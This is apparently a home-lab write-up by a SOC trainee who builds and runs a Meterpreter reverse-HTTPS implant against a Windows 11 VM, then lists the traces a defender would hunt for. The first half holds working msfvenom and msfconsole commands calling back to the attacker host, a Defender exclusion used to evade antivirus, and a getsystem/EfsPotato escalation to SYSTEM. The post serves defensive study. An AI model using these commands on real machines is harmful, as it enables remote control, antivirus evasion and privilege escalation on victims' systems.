Why I built the attack first

Most people studying for SOC roles learn detection from the outside in — they read what an alert should look like. I wanted the opposite. If I'm going to recognise a Meterpreter callback in a sea of logs, I want to have been the one who fired it.

I ran this on my own gear — a Kali attacker and a Windows 11 target, both VMs on an isolated VMware network with no route to my real home LAN. The goal wasn't to "hack a machine." I already know the commands exist. The goal was to sit on both sides of the same event: pull off a believable intrusion, then turn around and ask what trace it left behind for a defender to find.

I picked windows/meterpreter/reverse_https on purpose. It's not the loudest payload — it's the quiet one. The callback rides over TLS so the traffic looks like ordinary encrypted web browsing, and it beacons back to the attacker rather than holding an obvious open connection. That's exactly why it's worth understanding: a defender can't read the payload inside the TLS, so they have to catch it on behaviour instead. Building it taught me what that behaviour actually is.

// 01 — execution

The chain, step by step

Each step below is what I actually ran and what actually happened — including the parts that didn't go smoothly. The terminals are the real commands.

1

Generate the payload

// kali · msfvenom

I started by building the malicious executable. The first time, I ran msfvenom without telling it a format or an output file — and it dumped 575 bytes of raw shellcode straight to my terminal as garbled characters. That was a useful mistake: it made the difference between the payload and its container click for me. The shellcode is the same bytes either way; the -f exe flag just wraps them in a Windows PE structure with a loader stub so a double-click will actually run them.

root@kali: ~
root@kali:~# msfvenom --payload windows/meterpreter/reverse_https \
  LHOST=192.168.81.128 LPORT=8080 --format exe --out rev_https_8080.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows
[-] No arch selected, selecting arch: x86 from the payload
Payload size: 665 bytes
Saved as: rev_https_8080.exe (73,802 bytes)
What I took away

An .exe isn't "more dangerous" than raw shellcode — it's just packaged to be runnable. Understanding that container/payload split is what lets you reason about other delivery formats (DLL, macro, script) later.

2

Stand up the listener, then stage the file

// kali · msfconsole + apache

A payload is useless without something to catch its call home. I set up a multi/handler with the exact same payload baked into the exe — that match matters; mismatch it and the callback never completes. Then I served the file over a plain Apache server so the target could grab it. Worth noting there are two separate channels here: HTTP on port 80 just to download the file, and HTTPS on 8080 for the actual command-and-control. Confusing those two cost me a minute early on.

msf6 exploit(multi/handler)
msf6 use exploit/multi/handler
msf6 set PAYLOAD windows/meterpreter/reverse_https
msf6 set LHOST 192.168.81.128   set LPORT 8080
msf6 exploit
[*] Started HTTPS reverse handler on https://192.168.81.128:8080
What I took away

The handler payload has to mirror the implant's payload. That tiny detail is the whole reason a defender can sometimes predict where a beacon is going just by reading the binary.

3

Get past Windows Defender

// windows target · the real wall

This is where the lab stopped being a script. An unencoded Meterpreter payload is trivially caught by signature-based AV, so Defender flagged and removed the exe the moment it tried to land on disk. Instead of fighting the protection toggles, I went into the Virus & threat protection settings and used the option near the bottom — Add or remove exclusions — to tell Defender to ignore one specific folder.

Then I downloaded rev_https_8080.exe into that excluded folder and ran it from there. Because Defender was set to skip that location, the payload executed untouched and the session called straight back to my Kali machine. That detail reframed the whole thing for me: real intruders rarely "turn off the antivirus" wholesale — they carve out a narrow exception and operate inside it, leaving protection on everywhere else.

The lesson that stuck

Adding a Defender exclusion is a loud event, not a quiet one. The exception itself is a high-fidelity signal a defender can hunt for. Having created one to slip my payload through, I now read "new exclusion added" or "protected folder carved out" in a log as exactly the move it is.

4

Execution and the callback

// windows → kali · C2 loop closes

With the exclusion in place I ran the file, flipped back to msfconsole, and watched the session open. This is the payoff moment — the target reaching back out to me over "HTTPS." sysinfo confirmed the box.

meterpreter
[*] Meterpreter session 1 opened (192.168.81.128:8080 -> 192.168.81.129:56923)
meterpreter sysinfo
Computer     : DESKTOP-ORNJI5L
OS          : Windows 11 (10.0 Build 23526)
Architecture : x64
Meterpreter  : x86/windows  ← 32-bit session on a 64-bit host

Then the session got flaky — commands started timing out. That wasn't a dead connection; it was the x86 payload running inside a 32-bit (WOW64) process on a 64-bit machine, which is fragile. The honest fix is to migrate into a native 64-bit process. That's a real piece of tradecraft I only understood because I hit the symptom myself: operators migrate immediately because the original payload process is unstable and easy to kill.

// 02 — privilege escalation

From a user to SYSTEM

Landing a session gets you in. It doesn't get you control. The last move was climbing from my initial user context to the highest privilege the machine has.

I ran getsystem, and it succeeded via EfsPotato — one of the "Potato" family of attacks. In plain terms: it abuses Windows' EFSRPC interface to coerce the system into authenticating over a named pipe, captures that SYSTEM token, and impersonates it. The result is a jump straight to NT AUTHORITY\SYSTEM without needing a password.

meterpreter · escalation
meterpreter getsystem
...got system via technique 6 (Named Pipe Impersonation — EFSRPC variant, AKA EfsPotato).
Why this matters more than the win

The fact that EfsPotato worked tells me something about the target's patch level — Microsoft has closed several Potato variants over time. So "the exploit succeeded" isn't bragging; it's a finding. In a real assessment that line is a patch-management recommendation, not a trophy.

// 03 — the other side of the screen

What this looks like to a defender

This is the section that actually matters for the job I want. Having run the attack, here's the trail I'd be hunting for from a SOC console.

From my side it was clean: generate, stage, detonate, beacon home over TLS, escalate. Encrypted C2 over a web-looking port, an AV exclusion to slip the payload through, and a tokens-not-passwords climb to SYSTEM. Quiet by design — almost nothing here screams "malware" if you're only looking at content.

ENDPOINT
An unsigned ~72 KB executable writes to disk and immediately makes outbound network calls — a process that has no business talking to the internet suddenly does. Process-creation events (Security 4688 / Sysmon 1) tie the binary to its children.
DEFENSE EVASION
A new Defender exclusion appears and/or real-time protection drops. That state change is itself a high-fidelity alert — defenders watch for exactly this.
NETWORK
Periodic beaconing to :8080 over TLS — regular, low-jitter callbacks to a non-standard HTTPS port. You can't read the payload, but the rhythm gives it away.
ESCALATION
The EfsPotato climb leaves named-pipe artifacts (Sysmon 17/18) and an EFSRPC/lsarpc footprint — a process suddenly wielding a SYSTEM token it shouldn't have.

// 04 — how I'll use this for real

What changes when you've been the attacker

Before this lab, "Meterpreter callback" was a phrase in a study guide. Now it's something I've watched leave a machine. That's the difference I was after, and it shows up in concrete ways:

When an alert fires on an unsigned binary beaconing to an odd port over TLS, I won't treat it as an abstraction — I know what's on the other end of that connection, why the port is weird, and why the content is encrypted. When I see real-time protection disabled or a new AV exclusion, I read it as the deliberate move it is, not a config accident. And when a process suddenly holds a SYSTEM token, I know the shape of how it probably got there.

That's the loop I'm building toward in my work with Wazuh and detection engineering: run the technique, watch what it generates, then write the rule that would have caught it. This lab is one full turn of that loop — the offensive half done deliberately so the defensive half is grounded in something real instead of theory.
